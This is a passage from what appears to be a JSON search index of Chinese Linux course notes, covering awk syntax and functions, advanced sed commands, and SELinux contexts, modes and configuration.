\u7b2cN\u4e2a\u5b57\u6bb5 FS \u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u7a7a\u683c\uff09 RS \u8f93\u5165\u8bb0\u5f55\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u4e3a \\n \uff09 NR \u5df2\u7ecf\u8bfb\u5165\u7684\u8bb0\u5f55\u6570\uff08\u884c\u6570\uff09\uff08\u8bfb\u65b0\u6587\u4ef6\u4e5f\u7d2f\u52a0\uff09 FNR \u5f53\u524d\u8f93\u5165\u6587\u4ef6\u7684\u8bb0\u5f55\u6570\u3002\uff08\u8bfb\u65b0\u6587\u4ef6\u5148\u7f6e\u4e3a1\uff09 OFS \u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u7a7a\u683c\uff09 ORS \u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4 \\n \uff09 ARGC \u547d\u4ee4\u884c\u53c2\u6570\u4e2a\u6570 ARGING \u547d\u4ee4\u884c\u4e2d\u5f53\u524d\u6587\u4ef6\u7684\u4f4d\u7f6e ARGV \u547d\u4ee4\u884c\u53c2\u6570\u7684\u6570\u7ec4 \u683c\u5f0f\u5316\u6253\u5370 printf \uff1a %s , %d , %f \u5b57\u7b26\u4e32\uff0c\u6574\u6570\uff0c\u6d6e\u70b9\u6570 -\u5bbd\u5ea6.\u7cbe\u5ea6%\u683c\u5f0f \uff1a\u9ed8\u8ba4\u53f3\u5bf9\u9f50\uff0c - \u5de6\u5bf9\u9f50","title":"awk \u5165\u95e8"},{"location":"week02/awk\u5165\u95e8/#awk","text":"awk\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u57fa\u4e8e \u6a21\u5f0f-\u64cd\u4f5c \u5bf9\u6765\u5b8c\u6210\u7684\uff0c\u683c\u5f0f\uff1a \u6a21\u5f0f {\u64cd\u4f5c} \u5728awk\u4e2d\u7684\u6a21\u5f0f\u6709\uff1a \u6b63\u5219\u8868\u8fbe\u5f0f\u3002 ~ \uff1a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c !~ \u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u5339\u914d \u5173\u7cfb\u8868\u8fbe\u5f0f\u3002\u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a < , <= , != , == \u7b49 \u7ec4\u5408\u7684\u6a21\u5f0f\u3002 || , && , ! \u6a21\u5f0f1,\u6a21\u5f0f2 \uff1a\u4ece\u5339\u914d\u6a21\u5f0f1\u5230\u5339\u914d\u6a21\u5f0f2\u4e4b\u95f4\u7684\u8bb0\u5f55 BEGIN\uff1a\u5728\u8bfb\u53d6\u8f93\u5165\u524d\u6267\u884c\u4e00\u6b21 END\uff1a\u5728\u8bfb\u53d6\u6240\u6709\u8f93\u5165\u540e\u6267\u884c awk\u9009\u9879\uff1a F \u6307\u5b9a\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff09 f \u8fd0\u884cawk\u811a\u672c v \u9884\u5148\u4e3aawk\u7a0b\u5e8f\u6307\u5b9a\u53d8\u91cf $ awk -F: '{print $1}' /etc/passwd $ echo | awk -v user=$USER '{print user}' awk\u5e38\u7528\u5185\u7f6e\u53d8\u91cf\uff1a \u53d8\u91cf\u540d \u8bf4\u660e FILENAME \u8f93\u5165\u6587\u4ef6\u540d $0 \u5f53\u524d\u8bb0\u5f55\u7684\u5185\u5bb9 NF \u5f53\u524d\u8bb0\u5f55\u5b57\u6bb5\u6570\uff08\u5217\u6570\uff09 $N \u7b2cN\u4e2a\u5b57\u6bb5 FS \u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u7a7a\u683c\uff09 RS \u8f93\u5165\u8bb0\u5f55\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u4e3a \\n \uff09 NR \u5df2\u7ecf\u8bfb\u5165\u7684\u8bb0\u5f55\u6570\uff08\u884c\u6570\uff09\uff08\u8bfb\u65b0\u6587\u4ef6\u4e5f\u7d2f\u52a0\uff09 FNR \u5f53\u524d\u8f93\u5165\u6587\u4ef6\u7684\u8bb0\u5f55\u6570\u3002\uff08\u8bfb\u65b0\u6587\u4ef6\u5148\u7f6e\u4e3a1\uff09 OFS \u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u7a7a\u683c\uff09 ORS \u8f93\u51fa\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4 \\n \uff09 ARGC \u547d\u4ee4\u884c\u53c2\u6570\u4e2a\u6570 ARGING \u547d\u4ee4\u884c\u4e2d\u5f53\u524d\u6587\u4ef6\u7684\u4f4d\u7f6e ARGV \u547d\u4ee4\u884c\u53c2\u6570\u7684\u6570\u7ec4 \u683c\u5f0f\u5316\u6253\u5370 printf \uff1a %s , %d , %f \u5b57\u7b26\u4e32\uff0c\u6574\u6570\uff0c\u6d6e\u70b9\u6570 -\u5bbd\u5ea6.\u7cbe\u5ea6%\u683c\u5f0f \uff1a\u9ed8\u8ba4\u53f3\u5bf9\u9f50\uff0c - \u5de6\u5bf9\u9f50","title":"awk\u5165\u95e8"},{"location":"week02/awk\u51fd\u6570/","text":"awk\u51fd\u6570 \u6570\u5b66\u51fd\u6570\uff1a sin(x) cos(x) exp(x) int(x) rand() \uff1a\u8fd4\u56de\u968f\u673a\u6570\uff080<=r<1\uff09 \u5b57\u7b26\u4e32\u51fd\u6570\uff1a sub(r,s,t) \u5728\u5b57\u7b26\u4e32t\uff08\u9ed8\u8ba4\u4e3a $0 \uff09\u4e2d\u7528s\u66ff\u6362\u6b63\u5219\u8868\u8fbe\u5f0fr\u7684\u9996\u6b21\u5339\u914d gsub(r,s,t) \u5728\u5b57\u7b26\u4e32t\uff08\u9ed8\u8ba4\u4e3a $0 \uff09\u4e2d\u7528s\u66ff\u6362\u6b63\u5219\u8868\u8fbe\u5f0fr\u7684\u6240\u6709\u5339\u914d index(s,t) \u8fd4\u56det\u5728s\u4e2d\u7684\u4f4d\u7f6e length(s) match(s,r) \u6b63\u5219\u8868\u8fbe\u5f0fr\u5339\u914ds\uff0c\u8fd4\u56de\u51fa\u73b0\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u6ca1\u51fa\u73b0\u5219\u8fd4\u56de0 split(s,a,sep) \u4ee5sep\uff08\u9ed8\u8ba4\u4f7f\u7528FS\uff09\u5206\u5272s\u5230\u6570\u7ec4a\u4e2d\uff0c\u8fd4\u56de\u5143\u7d20\u4e2a\u6570 sprintf(\"fmt\", expr) \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 substr(s,p,n) s\u4e2d\u4ece\u4f4d\u7f6ep\u5f00\u59cb\u6700\u5927\u957f\u5ea6\u4e3an\u7684\u5b50\u4e32\uff1b\u82e5\u6ca1\u7ed9\u51fan\u8fd4\u56de\u4ecep\u5f00\u59cb\u5269\u4f59\u5b50\u4e32 tolower(s) , toupper(s) \u5927\u5c0f\u5199\u8f6c\u6362\uff0c\u8fd4\u56de\u65b0\u5b57\u7b26\u4e32 \u65f6\u95f4\u51fd\u6570\uff1a mktime() \u751f\u6210\u65f6\u95f4\u683c\u5f0f\uff1a mktime(\"2018 01 01 12 30 40\") strftime() \u683c\u5f0f\u5316\u65f6\u95f4\u8f93\u51fa systime() \u5f97\u5230\u65f6\u95f4\u6233\uff0c\u53731970-01-01\u5230\u73b0\u5728\u7684\u79d2\u6570 getline \u8bfb\u53d6\u4e0b\u4e00\u884c \u8bfb\u53d6\u547d\u4ee4\u8f93\u51fa\uff1a # \u8bfb\u53d6command\u6267\u884c\u7ed3\u679c\u5230\u53d8\u91cfoutput \"command\" | getline output; \u81ea\u5b9a\u4e49\u51fd\u6570\uff1a function \u51fd\u6570\u540d(\u53c2\u6570){ \u5185\u5bb9 return \u8fd4\u56de\u503c }","title":"awk \u51fd\u6570"},{"location":"week02/awk\u51fd\u6570/#awk","text":"\u6570\u5b66\u51fd\u6570\uff1a sin(x) cos(x) exp(x) int(x) rand() \uff1a\u8fd4\u56de\u968f\u673a\u6570\uff080<=r<1\uff09 \u5b57\u7b26\u4e32\u51fd\u6570\uff1a sub(r,s,t) \u5728\u5b57\u7b26\u4e32t\uff08\u9ed8\u8ba4\u4e3a $0 \uff09\u4e2d\u7528s\u66ff\u6362\u6b63\u5219\u8868\u8fbe\u5f0fr\u7684\u9996\u6b21\u5339\u914d gsub(r,s,t) \u5728\u5b57\u7b26\u4e32t\uff08\u9ed8\u8ba4\u4e3a $0 \uff09\u4e2d\u7528s\u66ff\u6362\u6b63\u5219\u8868\u8fbe\u5f0fr\u7684\u6240\u6709\u5339\u914d index(s,t) \u8fd4\u56det\u5728s\u4e2d\u7684\u4f4d\u7f6e length(s) match(s,r) \u6b63\u5219\u8868\u8fbe\u5f0fr\u5339\u914ds\uff0c\u8fd4\u56de\u51fa\u73b0\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u6ca1\u51fa\u73b0\u5219\u8fd4\u56de0 split(s,a,sep) \u4ee5sep\uff08\u9ed8\u8ba4\u4f7f\u7528FS\uff09\u5206\u5272s\u5230\u6570\u7ec4a\u4e2d\uff0c\u8fd4\u56de\u5143\u7d20\u4e2a\u6570 sprintf(\"fmt\", expr) \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 substr(s,p,n) s\u4e2d\u4ece\u4f4d\u7f6ep\u5f00\u59cb\u6700\u5927\u957f\u5ea6\u4e3an\u7684\u5b50\u4e32\uff1b\u82e5\u6ca1\u7ed9\u51fan\u8fd4\u56de\u4ecep\u5f00\u59cb\u5269\u4f59\u5b50\u4e32 tolower(s) , toupper(s) \u5927\u5c0f\u5199\u8f6c\u6362\uff0c\u8fd4\u56de\u65b0\u5b57\u7b26\u4e32 \u65f6\u95f4\u51fd\u6570\uff1a mktime() \u751f\u6210\u65f6\u95f4\u683c\u5f0f\uff1a mktime(\"2018 01 01 12 30 40\") strftime() \u683c\u5f0f\u5316\u65f6\u95f4\u8f93\u51fa systime() \u5f97\u5230\u65f6\u95f4\u6233\uff0c\u53731970-01-01\u5230\u73b0\u5728\u7684\u79d2\u6570 getline \u8bfb\u53d6\u4e0b\u4e00\u884c \u8bfb\u53d6\u547d\u4ee4\u8f93\u51fa\uff1a # \u8bfb\u53d6command\u6267\u884c\u7ed3\u679c\u5230\u53d8\u91cfoutput \"command\" | getline output; \u81ea\u5b9a\u4e49\u51fd\u6570\uff1a function \u51fd\u6570\u540d(\u53c2\u6570){ \u5185\u5bb9 return \u8fd4\u56de\u503c }","title":"awk\u51fd\u6570"},{"location":"week02/awk\u6d41\u7a0b\u63a7\u5236/","text":"awk\u6d41\u7a0b\u63a7\u5236 awk\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236\u8bed\u53e5\u548c\u5176\u4ed6\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\uff08C\u3001Java\u7b49\uff09\u76f8\u5dee\u4e0d\u5927\u3002 \u6761\u4ef6\u8bed\u53e5\uff1a if(\u6761\u4ef6){ \u64cd\u4f5c } else if(\u6761\u4ef6){ \u64cd\u4f5c } else{ \u64cd\u4f5c } \u5faa\u73af\uff1a # while\u5faa\u73af while(\u6761\u4ef6){ \u64cd\u4f5c } # do-while\u5faa\u73af do{ \u64cd\u4f5c } while(\u6761\u4ef6) # for\u5faa\u73af for(i=1;i<N;i++){ \u64cd\u4f5c }","title":"awk \u6d41\u7a0b\u63a7\u5236"},{"location":"week02/awk\u6d41\u7a0b\u63a7\u5236/#awk","text":"awk\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236\u8bed\u53e5\u548c\u5176\u4ed6\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\uff08C\u3001Java\u7b49\uff09\u76f8\u5dee\u4e0d\u5927\u3002 \u6761\u4ef6\u8bed\u53e5\uff1a if(\u6761\u4ef6){ \u64cd\u4f5c } else if(\u6761\u4ef6){ \u64cd\u4f5c } else{ \u64cd\u4f5c } \u5faa\u73af\uff1a # while\u5faa\u73af while(\u6761\u4ef6){ \u64cd\u4f5c } # do-while\u5faa\u73af do{ \u64cd\u4f5c } while(\u6761\u4ef6) # for\u5faa\u73af for(i=1;i<N;i++){ \u64cd\u4f5c }","title":"awk\u6d41\u7a0b\u63a7\u5236"},{"location":"week02/\u9ad8\u7ea7Sed\u4f7f\u7528/","text":"\u9ad8\u7ea7Sed\u4f7f\u7528 \u4f7f\u7528 -e \uff1a sed -e '\u547d\u4ee4' -e '\u547d\u4ee4' \u6587\u4ef6 \u53ef\u4ee5\u6307\u5b9a\u5904\u7406\u7684\u884c\u6216\u8005\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u884c \u6ca1\u6709\u6307\u5b9a\u5730\u5740\uff1a\u5e94\u7528\u4e8e\u6bcf\u4e00\u884c \u5730\u5740\u540e\u8ddf\u6709\u611f\u53f9\u53f7\uff1a\u5e94\u7528\u4e8e\u4e0d\u5339\u914d\u7684\u6240\u6709\u884c \u5206\u7ec4\u547d\u4ee4\uff1a\u4f7f\u7528\u5927\u62ec\u53f7 {} \u5c06\u4e00\u4e2a\u5730\u5740\u5d4c\u5957\u5728\u53e6\u4e00\u4e2a\u5730\u5740\u4e2d\uff0c\u6216\u8005\u5728\u76f8\u540c\u7684\u5730\u5740\u4e0a\u5e94\u7528\u591a\u4e2a\u547d\u4ee4 \u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\uff1a \u547d\u4ee4 \u542b\u4e49 N \u8ffd\u52a0\u4e0b\u4e00\u884c D \u5220\u9664\u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\u7684\u7b2c\u4e00\u884c P \u6253\u5370\u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\u7684\u7b2c\u4e00\u884c \u4fdd\u6301\u7a7a\u95f4\uff08\u6682\u5b58\u7a7a\u95f4\uff09\uff1a \u547d\u4ee4 \u542b\u4e49 h \u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u590d\u5236\u5230\u4fdd\u6301\u7a7a\u95f4 H \u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u4fdd\u6301\u7a7a\u95f4 g \u5c06\u4fdd\u6301\u7a7a\u95f4\u7684\u5185\u5bb9\u590d\u5236\u5230\u6a21\u5f0f\u7a7a\u95f4 G \u5c06\u4fdd\u6301\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u6a21\u5f0f\u7a7a\u95f4 x \u4ea4\u6362\u4fdd\u6301\u7a7a\u95f4\u548c\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9 \u5b9a\u4e49\u6807\u7b7e\uff1a :label \u6807\u7b7e\u540d<7\u5b57\u7b26 \u6807\u7b7e\u72ec\u5360\u4e00\u884c\u4e14\u4ee5 : \u5f00\u59cb \u884c\u7ed3\u5c3e\u5904\u7684\u7a7a\u683c\u89c6\u4e3a\u6807\u7b7e\u7684\u4e00\u90e8\u5206 \u6d41\u7a0b\u63a7\u5236\uff1a b \u5206\u652f\uff08\u65e0\u6761\u4ef6\u8f6c\u79fb\uff09 t \u6d4b\u8bd5\uff08\u6709\u6761\u4ef6\u8f6c\u79fb\uff09 \u82e5\u6ca1\u6709\u6307\u5b9a\u6807\u7b7e\u5219\u8f6c\u79fb\u5230\u811a\u672c\u7684\u7ed3\u5c3e\u5904","title":"\u9ad8\u7ea7 Sed \u4f7f\u7528"},{"location":"week02/\u9ad8\u7ea7Sed\u4f7f\u7528/#sed","text":"\u4f7f\u7528 -e \uff1a sed -e '\u547d\u4ee4' -e '\u547d\u4ee4' \u6587\u4ef6 \u53ef\u4ee5\u6307\u5b9a\u5904\u7406\u7684\u884c\u6216\u8005\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u884c \u6ca1\u6709\u6307\u5b9a\u5730\u5740\uff1a\u5e94\u7528\u4e8e\u6bcf\u4e00\u884c \u5730\u5740\u540e\u8ddf\u6709\u611f\u53f9\u53f7\uff1a\u5e94\u7528\u4e8e\u4e0d\u5339\u914d\u7684\u6240\u6709\u884c \u5206\u7ec4\u547d\u4ee4\uff1a\u4f7f\u7528\u5927\u62ec\u53f7 {} \u5c06\u4e00\u4e2a\u5730\u5740\u5d4c\u5957\u5728\u53e6\u4e00\u4e2a\u5730\u5740\u4e2d\uff0c\u6216\u8005\u5728\u76f8\u540c\u7684\u5730\u5740\u4e0a\u5e94\u7528\u591a\u4e2a\u547d\u4ee4 \u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\uff1a \u547d\u4ee4 \u542b\u4e49 N \u8ffd\u52a0\u4e0b\u4e00\u884c D \u5220\u9664\u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\u7684\u7b2c\u4e00\u884c P \u6253\u5370\u591a\u884c\u6a21\u5f0f\u7a7a\u95f4\u7684\u7b2c\u4e00\u884c \u4fdd\u6301\u7a7a\u95f4\uff08\u6682\u5b58\u7a7a\u95f4\uff09\uff1a \u547d\u4ee4 \u542b\u4e49 h \u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u590d\u5236\u5230\u4fdd\u6301\u7a7a\u95f4 H \u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u4fdd\u6301\u7a7a\u95f4 g \u5c06\u4fdd\u6301\u7a7a\u95f4\u7684\u5185\u5bb9\u590d\u5236\u5230\u6a21\u5f0f\u7a7a\u95f4 G \u5c06\u4fdd\u6301\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u6a21\u5f0f\u7a7a\u95f4 x \u4ea4\u6362\u4fdd\u6301\u7a7a\u95f4\u548c\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9 \u5b9a\u4e49\u6807\u7b7e\uff1a :label \u6807\u7b7e\u540d<7\u5b57\u7b26 \u6807\u7b7e\u72ec\u5360\u4e00\u884c\u4e14\u4ee5 : \u5f00\u59cb \u884c\u7ed3\u5c3e\u5904\u7684\u7a7a\u683c\u89c6\u4e3a\u6807\u7b7e\u7684\u4e00\u90e8\u5206 \u6d41\u7a0b\u63a7\u5236\uff1a b \u5206\u652f\uff08\u65e0\u6761\u4ef6\u8f6c\u79fb\uff09 t \u6d4b\u8bd5\uff08\u6709\u6761\u4ef6\u8f6c\u79fb\uff09 \u82e5\u6ca1\u6709\u6307\u5b9a\u6807\u7b7e\u5219\u8f6c\u79fb\u5230\u811a\u672c\u7684\u7ed3\u5c3e\u5904","title":"\u9ad8\u7ea7Sed\u4f7f\u7528"},{"location":"week03/SELinux\u7b56\u7565\u4e0e\u89c4\u5219\u7ba1\u7406/","text":"SELinux\u7b56\u7565\u4e0e\u89c4\u5219\u7ba1\u7406 \u67e5\u770bSELinux\u4e0a\u4e0b\u6587\uff1a ls -Z \u67e5\u770b\u6587\u4ef6\u3001\u76ee\u5f55\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u65b0\u5efa\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u4f1a\u7ee7\u627f\u5176\u7236\u76ee\u5f55\u7684SELinux\u7c7b\u578b\uff09 ps -Z \u67e5\u770b\u8fdb\u7a0b\u7684\u5b89\u5168\u4e0a\u4e0b\u6587 id -Z \u67e5\u770b\u5f53\u524d\u7528\u6237\u7684\u5b89\u5168\u4e0a\u4e0b\u6587 \u5b89\u5168\u4e0a\u4e0b\u6587\u8bed\u6cd5\uff1a user:role:type:level user \u7528\u6237\u8eab\u4efd\uff0c\u7528\u6237\u4f1a\u8bdd\u671f\u95f4\u4e0d\u6539\u53d8\uff0c\u4e0d\u540c\u4e8eLinux\u7528\u6237 unconfined_u\uff1a\u4e0d\u53d7\u9650\u7684\u7528\u6237 system_u\uff1a\u7cfb\u7edf\u7528\u6237 role \u88ab\u6388\u6743\u4e8e\u9886\u57df\uff08domains\uff09\uff0c\u63a7\u5236\u5bf9\u8c61\u7c7b\u578b\u7684\u8bbf\u95ee object_r\uff1a\u4ee3\u8868\u6587\u4ef6\u6216\u76ee\u5f55\u7b49\u6587\u4ef6\u8d44\u6e90 system_r\uff1a\u4ee3\u8868\u7a0b\u5e8f type \u51b3\u5b9a\u4e3b\u4f53\u7a0b\u5e8f\u80fd\u5426\u8bfb\u53d6\u6587\u4ef6\u8d44\u6e90\uff0c\u4ee5\u53ca\u5982\u4f55\u8bbf\u95ee\u548c\u57df\u7b49\u89c4\u5219\u3002\u5f53\u4e00\u4e2a\u7c7b\u578b\u4e0e\u6267\u884c\u4e2d\u7684\u8fdb\u7a0b\u76f8\u5173\u8054\u65f6\uff0c\u5176type\u4e5f\u79f0\u4e3adomain \u6587\u4ef6\u7684SELinux\u4e0a\u4e0b\u6587\u4e34\u65f6\u4fee\u6539\uff1a chcon \uff1a --reference=file \u8bbe\u7f6e\u4e3a\u4e0efile\u6587\u4ef6\u76f8\u540c -u \u8bbe\u7f6e\u7528\u6237\u8eab\u4efd -r \u8bbe\u7f6e\u89d2\u8272 -t \u8bbe\u7f6e\u7c7b\u578b -R \u9012\u5f52\u5904\u7406\u6587\u4ef6\u53ca\u5b50\u76ee\u5f55 \u6587\u4ef6\u7684SELinux\u4e0a\u4e0b\u6587\u6c38\u4e45\u4fee\u6539\uff1a semanage \uff1a \u9700\u8981\u5148\u5b89\u88c5\u8be5\u5de5\u5177\uff1a $ sudo yum install policycoreutils-python","title":"SELinux \u7b56\u7565\u4e0e\u89c4\u5219\u7ba1\u7406"},{"location":"week03/SELinux\u7b56\u7565\u4e0e\u89c4\u5219\u7ba1\u7406/#selinux","text":"\u67e5\u770bSELinux\u4e0a\u4e0b\u6587\uff1a ls -Z \u67e5\u770b\u6587\u4ef6\u3001\u76ee\u5f55\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u65b0\u5efa\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u4f1a\u7ee7\u627f\u5176\u7236\u76ee\u5f55\u7684SELinux\u7c7b\u578b\uff09 ps -Z \u67e5\u770b\u8fdb\u7a0b\u7684\u5b89\u5168\u4e0a\u4e0b\u6587 id -Z \u67e5\u770b\u5f53\u524d\u7528\u6237\u7684\u5b89\u5168\u4e0a\u4e0b\u6587 \u5b89\u5168\u4e0a\u4e0b\u6587\u8bed\u6cd5\uff1a user:role:type:level user \u7528\u6237\u8eab\u4efd\uff0c\u7528\u6237\u4f1a\u8bdd\u671f\u95f4\u4e0d\u6539\u53d8\uff0c\u4e0d\u540c\u4e8eLinux\u7528\u6237 unconfined_u\uff1a\u4e0d\u53d7\u9650\u7684\u7528\u6237 system_u\uff1a\u7cfb\u7edf\u7528\u6237 role \u88ab\u6388\u6743\u4e8e\u9886\u57df\uff08domains\uff09\uff0c\u63a7\u5236\u5bf9\u8c61\u7c7b\u578b\u7684\u8bbf\u95ee object_r\uff1a\u4ee3\u8868\u6587\u4ef6\u6216\u76ee\u5f55\u7b49\u6587\u4ef6\u8d44\u6e90 system_r\uff1a\u4ee3\u8868\u7a0b\u5e8f type \u51b3\u5b9a\u4e3b\u4f53\u7a0b\u5e8f\u80fd\u5426\u8bfb\u53d6\u6587\u4ef6\u8d44\u6e90\uff0c\u4ee5\u53ca\u5982\u4f55\u8bbf\u95ee\u548c\u57df\u7b49\u89c4\u5219\u3002\u5f53\u4e00\u4e2a\u7c7b\u578b\u4e0e\u6267\u884c\u4e2d\u7684\u8fdb\u7a0b\u76f8\u5173\u8054\u65f6\uff0c\u5176type\u4e5f\u79f0\u4e3adomain \u6587\u4ef6\u7684SELinux\u4e0a\u4e0b\u6587\u4e34\u65f6\u4fee\u6539\uff1a chcon \uff1a --reference=file \u8bbe\u7f6e\u4e3a\u4e0efile\u6587\u4ef6\u76f8\u540c -u \u8bbe\u7f6e\u7528\u6237\u8eab\u4efd -r \u8bbe\u7f6e\u89d2\u8272 -t \u8bbe\u7f6e\u7c7b\u578b -R \u9012\u5f52\u5904\u7406\u6587\u4ef6\u53ca\u5b50\u76ee\u5f55 \u6587\u4ef6\u7684SELinux\u4e0a\u4e0b\u6587\u6c38\u4e45\u4fee\u6539\uff1a semanage \uff1a \u9700\u8981\u5148\u5b89\u88c5\u8be5\u5de5\u5177\uff1a $ sudo yum install policycoreutils-python","title":"SELinux\u7b56\u7565\u4e0e\u89c4\u5219\u7ba1\u7406"},{"location":"week03/SELinux\u7b80\u4ecb/","text":"SELinux\u7b80\u4ecb SELinux\u914d\u7f6e\u6587\u4ef6\uff1a /etc/selinux/config \uff1a # disabled: \u5173\u95edSELinux # permissive\uff1a\u5f53\u64cd\u4f5c\u8d8a\u8fc7SELinux\u8bbe\u7f6e\u7684\u6743\u9650\u3001\u7b56\u7565\u65f6\uff0c\u6253\u5370\u8b66\u544a\u3001\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4f46\u4e0d\u963b\u6b62 # enforcing\uff1a\u5f53\u64cd\u4f5c\u8d8a\u8fc7\u4e86SELinux\u8bbe\u7f6e\u7684\u6743\u9650\u3001\u7b56\u7565\u65f6\uff0c\u8bb0\u5f55\u65e5\u5fd7\uff0c\u5e76\u963b\u6b62 SELINUX=permissive # targeted\uff1a\u9488\u5bf9\u670d\u52a1\u8fdb\u7a0b\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236 # minimum\uff1a\u7531target\u4fee\u8ba2\u800c\u6765\uff0c\u9488\u5bf9\u9009\u62e9\u90e8\u5206\u7684\u8fdb\u7a0b\u4fdd\u62a4 # mls\uff1a\u9488\u5bf9\u6240\u6709\u8fdb\u7a0b\u8fdb\u884c\u591a\u7ea7\u522b\u8bbf\u95ee\u63a7\u5236 SELINUXTYPE=targeted \u4fee\u6539SELinux\u914d\u7f6e\u6587\u4ef6\u9700\u91cd\u542f\u7535\u8111\u751f\u6548\u3002\u4f7f\u7528 minimum \u6216 mls \u7b56\u7565\u9700\u8981\u5b89\u88c5\uff1a $ sudo yum install selinux-policy-minimum selinux-policy-mls \u83b7\u53d6SELinux\u72b6\u6001\uff1a $ getenforce \u83b7\u53d6SELinux\u8be6\u7ec6\u72b6\u6001\uff1a $ sestatus \u4e34\u65f6\u5207\u6362SELinux\u72b6\u6001\uff080-Permissive 1-Enforcing\uff09\uff1a $ sudo setenforce 1 SELinux\u7684\u65e5\u5fd7\uff1a \u82e5auditd\u5f00\u542f\uff0c\u8bb0\u5f55\u5230/var/log/audit/audit.log \u82e5rsyslog\u5f00\u542f\u800cauditd\u672a\u5f00\u542f\uff0c\u8bb0\u5f55\u5230/var/log/messages \u82e5\u5b89\u88c5\u4e86setroubleshoot\uff0c\u4e14rsyslog\u548cauditd\u5747\u5f00\u542f\uff0c\u5728/var/log/audit/audit.log\u4e2d\u8bb0\u5f55\uff0c\u5e76\u5c06\u5176\u7ffb\u8bd1\u540e\u5199\u5165/var/log/messages\uff0c\u53ef\u8bfb\u6027\u66f4\u597d \u5b89\u88c5setrouble\uff1a $ sudo yum install setroubleshoot-server \uff0c\u7136\u540e\u91cd\u542fauditd\u751f\u6548\u3002","title":"SELinux \u7b80\u4ecb"},{"location":"week03/SELinux\u7b80\u4ecb/#selinux","text":"SELinux\u914d\u7f6e\u6587\u4ef6\uff1a /etc/selinux/config \uff1a # disabled: \u5173\u95edSELinux # permissive\uff1a\u5f53\u64cd\u4f5c\u8d8a\u8fc7SELinux\u8bbe\u7f6e\u7684\u6743\u9650\u3001\u7b56\u7565\u65f6\uff0c\u6253\u5370\u8b66\u544a\u3001\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4f46\u4e0d\u963b\u6b62 # enforcing\uff1a\u5f53\u64cd\u4f5c\u8d8a\u8fc7\u4e86SELinux\u8bbe\u7f6e\u7684\u6743\u9650\u3001\u7b56\u7565\u65f6\uff0c\u8bb0\u5f55\u65e5\u5fd7\uff0c\u5e76\u963b\u6b62 SELINUX=permissive # targeted\uff1a\u9488\u5bf9\u670d\u52a1\u8fdb\u7a0b\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236 # minimum\uff1a\u7531target\u4fee\u8ba2\u800c\u6765\uff0c\u9488\u5bf9\u9009\u62e9\u90e8\u5206\u7684\u8fdb\u7a0b\u4fdd\u62a4 # mls\uff1a\u9488\u5bf9\u6240\u6709\u8fdb\u7a0b\u8fdb\u884c\u591a\u7ea7\u522b\u8bbf\u95ee\u63a7\u5236 SELINUXTYPE=targeted \u4fee\u6539SELinux\u914d\u7f6e\u6587\u4ef6\u9700\u91cd\u542f\u7535\u8111\u751f\u6548\u3002\u4f7f\u7528 minimum \u6216 mls \u7b56\u7565\u9700\u8981\u5b89\u88c5\uff1a $ sudo yum install selinux-policy-minimum selinux-policy-mls \u83b7\u53d6SELinux\u72b6\u6001\uff1a $ getenforce \u83b7\u53d6SELinux\u8be6\u7ec6\u72b6\u6001\uff1a $ sestatus \u4e34\u65f6\u5207\u6362SELinux\u72b6\u6001\uff080-Permissive 1-Enforcing\uff09\uff1a $ sudo setenforce 1 SELinux\u7684\u65e5\u5fd7\uff1a \u82e5auditd\u5f00\u542f\uff0c\u8bb0\u5f55\u5230/var/log/audit/audit.log \u82e5rsyslog\u5f00\u542f\u800cauditd\u672a\u5f00\u542f\uff0c\u8bb0\u5f55\u5230/var/log/messages 